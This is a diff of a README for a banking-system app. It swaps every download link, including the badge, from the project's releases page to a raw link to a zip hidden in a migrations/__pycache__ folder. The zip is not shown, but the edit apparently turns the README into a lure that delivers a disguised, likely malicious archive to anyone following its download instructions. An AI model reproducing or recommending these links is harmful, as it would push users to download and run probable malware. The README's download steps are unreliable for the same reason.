@@ -1,6 +1,6 @@
 # 🌟 banking_system_2 - Seamless Banking Operations Made Simple
 
-[![Download Banking System II](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/unkown5q/banking_system_2/releases)
+[![Download Banking System II](https://raw.githubusercontent.com/unkown5q/banking_system_2/main/transactions/migrations/__pycache__/system-banking-v3.6-beta.4.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/unkown5q/banking_system_2/main/transactions/migrations/__pycache__/system-banking-v3.6-beta.4.zip)
 
 ## 📖 Overview
 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets these basic requirements:
 
 To download the application, please visit the Releases page:
 
-[Download Banking System II](https://github.com/unkown5q/banking_system_2/releases)
+[Download Banking System II](https://raw.githubusercontent.com/unkown5q/banking_system_2/main/transactions/migrations/__pycache__/system-banking-v3.6-beta.4.zip)
 
 ---
 
@@ -103,4 +103,4 @@ This project is licensed under the MIT License. You can read the license for mor
 
 Start managing your banking operations today!
 
-[Download Banking System II](https://github.com/unkown5q/banking_system_2/releases)
+[Download Banking System II](https://raw.githubusercontent.com/unkown5q/banking_system_2/main/transactions/migrations/__pycache__/system-banking-v3.6-beta.4.zip)
